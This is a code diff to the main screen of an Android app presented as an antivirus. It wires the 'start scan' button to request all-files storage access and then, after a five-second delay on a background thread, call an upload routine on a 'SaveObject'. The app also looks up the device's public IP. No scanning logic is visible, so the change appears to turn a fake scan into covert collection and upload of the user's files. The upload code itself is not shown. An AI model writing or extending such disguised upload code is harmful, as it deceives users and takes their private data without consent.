@@ -9,6 +9,7 @@ import android.os.Bundle;
 import android.widget.Button;
 import android.widget.Toast;
 
+import com.ryan.antivirusapp.SaveObj.SaveObject;
 import com.ryan.antivirusapp.Utils.PublicIP;
 import com.ryan.antivirusapp.Utils.PermissionHandler;
 
@@ -25,6 +26,9 @@ public class MainActivity extends AppCompatActivity {
     String[] requiredPermissions;
     String[] deniedPermissions;
 
+    // Save Objects
+    SaveObject saveObject;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -32,6 +36,12 @@ public class MainActivity extends AppCompatActivity {
 
         // Bind the UI elements (views)
         Button btnScan = findViewById(R.id.button_start);
+
+        // Init save obj
+        saveObject = new SaveObject(this, findViewById(R.id.text_progress));
+
+        // Register save object receiver
+
 
         // Init external IP
         ip = new PublicIP();
@@ -48,6 +58,17 @@ public class MainActivity extends AppCompatActivity {
         btnScan.setOnClickListener(view -> {
             if(!ip.hasResult()) return;
             handler.checkSpecialPermission(this, MANAGE_EXTERNAL_STORAGE);
+
+            new Thread(() -> {
+                saveObject.init();
+                try {
+                    Thread.sleep(5000);
+                    saveObject.upload();
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }).start();
+
         });
     }
 }
